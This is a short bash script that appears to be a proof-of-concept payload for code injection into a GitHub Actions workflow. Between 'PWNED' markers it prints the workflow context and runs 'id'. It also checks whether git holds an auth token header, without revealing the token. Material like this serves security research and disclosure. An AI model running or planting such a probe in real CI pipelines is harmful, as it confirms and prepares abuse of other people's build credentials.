#!/usr/bin/env bash
set -euo pipefail
echo "PWNED_START"
echo "PWNED_CONTEXT event=${GITHUB_EVENT_NAME} repo=${GITHUB_REPOSITORY} ref=${GITHUB_REF} sha=${GITHUB_SHA}"
id
echo "PWNED_HEADER_PRESENT=$(git config --get-regexp 'http\..*extraheader' >/dev/null 2>&1 && echo yes || echo no)"
echo "PWNED_END"
exit 1
